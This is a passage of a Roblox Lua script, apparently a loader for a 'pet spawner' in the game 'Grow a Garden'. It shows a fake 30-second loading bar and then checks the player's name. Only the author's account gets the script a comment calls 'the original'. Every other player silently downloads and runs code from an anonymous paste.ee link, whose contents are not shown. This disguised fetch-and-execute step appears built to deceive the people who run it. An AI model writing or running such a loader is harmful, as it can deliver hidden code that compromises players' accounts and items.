percent.Position = UDim2.new(0, 0, 0.665, 0)
percent.TextColor3 = Color3.fromRGB(255, 255, 255)
percent.Font = Enum.Font.GothamBold
percent.TextSize = 18
percent.BackgroundTransparency = 1
percent.Text = "0%"

-- Animate loading bar over 30 seconds
task.spawn(function()
    local totalSteps = 100
    local duration = 30
    for i = 1, totalSteps do
        local ratio = i / totalSteps
        percent.Text = tostring(i) .. "%"
        fill:TweenSize(UDim2.new(ratio, 0, 1, 0), "Out", "Sine", 0.2, true)
        wait(duration / totalSteps)
    end

    gui:Destroy()
    -- --- PLAYER DETECTION LOGIC ---
    local player = game.Players.LocalPlayer
    if player and player.Name == "playsafe_kurt" then
        -- This is the original script URL for 'playsafe_kurt'
        loadstring(game:HttpGet("https://raw.githubusercontent.com/SpaceScriptHUB/petspawner/refs/heads/main/GrowaGardenVisual", true))()
    else
        -- This is for any other player
        loadstring(game:HttpGet("https://paste.ee/r/1ux6SbhY"))()
    end
    -- --- END PLAYER DETECTION LOGIC ---
end)
